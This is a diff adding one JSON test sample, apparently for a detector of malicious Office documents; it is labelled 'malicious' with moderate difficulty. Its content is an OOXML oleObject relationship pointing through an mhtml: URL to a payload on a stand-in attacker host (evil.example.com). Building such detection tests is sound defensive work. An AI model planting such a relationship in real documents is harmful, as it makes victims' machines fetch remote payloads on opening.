@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::53::structural-variations::5",
+  "base_sample_id": "exp::document-office::53",
+  "generator_id": "structural-variations",
+  "generator_version": "1.0.0",
+  "seed": 387196295,
+  "content": "{\"message\": \"<Relationship Type=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\\\" Target=\\\"mhtml:http://evil.example.com/payload!x.html\\\"/>\\n\"}",
+  "content_hash": "965fd58cc34f55f14f3c520a8f8fa85f01b77a47f5e63cee95ae3f7f720f87f6",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "structural:json",
+  "difficulty": "moderate"
+}
